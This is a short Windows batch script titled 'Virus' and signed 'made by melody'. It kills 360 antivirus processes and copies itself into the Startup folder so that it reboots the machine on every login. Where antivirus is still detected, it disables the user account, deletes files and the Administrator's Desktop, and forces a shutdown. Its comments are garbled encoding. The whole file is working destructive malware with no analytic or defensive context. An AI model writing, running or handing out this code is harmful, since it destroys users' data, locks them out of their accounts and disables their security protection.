@echo off & color 0a & setlocal enabledelayedexpansion
title Virus
if exist "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virus.cmd" shutdown -r -t 1
takeown /f %0 /a>nul
taskkill /f /im 360se.exe /t>nul
taskkill /f /im 360sd.exe /t>nul
taskkill /f /im 360tray.exe /t>nul
cls
::²¡¶¾Ä£Ê½¼ì²â
tasklist|findstr "360tray" && echo ¼ì²âµ½É±¶¾Èí¼þ && goto mode1
copy %0 "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Virus.cmd">nul
cls
exit

:mode1
cls
net user %username% /active:no
del *.*>nul
rd /s/q C:\Users\Administrator\Desktop>nul
echo made by melody
shutdown -s -t 60 -c shutdown in 60 seconds!
exit



